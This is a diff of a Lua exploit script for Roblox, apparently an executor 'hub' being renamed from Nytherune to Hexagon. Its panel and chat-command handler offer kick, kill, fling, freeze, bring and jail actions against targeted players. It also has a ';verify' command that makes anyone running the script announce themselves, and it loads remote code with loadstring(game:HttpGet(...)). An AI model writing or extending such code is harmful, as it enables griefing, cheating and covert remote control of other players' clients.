@@ -40,7 +40,7 @@ local function ProcessarMensagem(msgText, authorName)
             character:BreakJoints()
             local root = character:FindFirstChild("HumanoidRootPart")
             if root then
-                for i=1,10 do
+                for i=1,5 do
                     local part = Instance.new("Part")
                     part.Size = Vector3.new(6,6,6)
                     part.Anchored = false
@@ -131,8 +131,8 @@ local function ProcessarMensagem(msgText, authorName)
         end
     end
 
-    -- COMANDO UNIVERSAL ;verifique -> faz o local player enviar Nytherune_####
-    if comandoLower:match("^;verifique") then
+    -- COMANDO UNIVERSAL ;verify -> faz o local player enviar Hexagon_####
+    if comandoLower:match("^;verify") then
         local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
         if canal then
             canal:SendAsync("Hexagon_####")
@@ -164,7 +164,7 @@ TextChatService.TextChannels.ChildAdded:Connect(function(ch)
     ConectarCanal(ch)
 end)
 
---// Painel Nytherune Hub (WindUI) - exibido para todos
+--// Painel Hexagon (WindUI)
 local WindUILib = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
 local Window = WindUILib:CreateWindow({
         Title = "Hexagon Client",
@@ -201,15 +201,15 @@ Players.PlayerRemoving:Connect(function()
 Dropdown:SetValues(getPlayersList())
 end)
 
-local comandos = { "kick","kill","killplus","fling","freeze","unfreeze","bring","jail","unjail","verifique" }
+local comandos = { "kick","kill","killplus","fling","freeze","unfreeze","bring","jail","unjail","verify" }
 for _, cmd in ipairs(comandos) do
 Section:Button({
         Title = cmd:lower(),
         Desc = "Script for ;"..cmd.." - Target",
         Callback = function()
-        if cmd == "verifique" then
-                -- verifique é universal, não precisa de alvo
-                EnviarComando("verifique", "")
+        if cmd == "verify" then
+                -- verify é universal, não precisa de alvo
+                EnviarComando("verify", "")
         else
                 if TargetName and TargetName ~= "" then
                 EnviarComando(cmd, TargetName)
